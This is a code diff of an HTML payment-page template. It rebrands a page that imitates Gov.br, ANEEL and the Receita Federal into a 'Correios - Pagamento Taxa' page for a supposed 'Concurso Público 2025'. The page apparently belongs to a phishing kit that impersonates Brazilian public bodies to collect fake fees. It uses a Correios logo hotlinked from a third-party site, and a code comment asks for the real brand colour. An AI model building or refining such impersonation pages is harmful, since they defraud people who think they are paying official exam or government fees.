@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 
-{% block title %}Gov.br - Pagamento{% endblock %}
+{% block title %}Correios - Pagamento Taxa{% endblock %}
 
 {% block body_class %}bg-gray-50 min-h-screen flex flex-col{% endblock %}
 
@@ -32,7 +32,7 @@
             theme: {
                 extend: {
                     colors: {
-                        'gov-blue': '#003399',
+                        'correios-blue': '#007bff', // Example Correios blue color -  replace with actual color if known
                     }
                 }
             }
@@ -41,24 +41,24 @@
 {% endblock %}
 
 {% block content %}
-    <!-- Header Branco com Logo Gov.br -->
-    <div class="bg-white py-4 shadow-sm">
+    <!-- Header -->
+    <div class="bg-white py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
+                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
                 <div>
-                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
-                        ANEEL - Agência Nacional de Energia Elétrica
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
+                        CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
-                        Em parceria com a Receita Federal do Brasil
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Conteúdo atual permanece o mesmo -->
+    <!-- Main Content -->
     {{ super() }}
 {% endblock %}
 
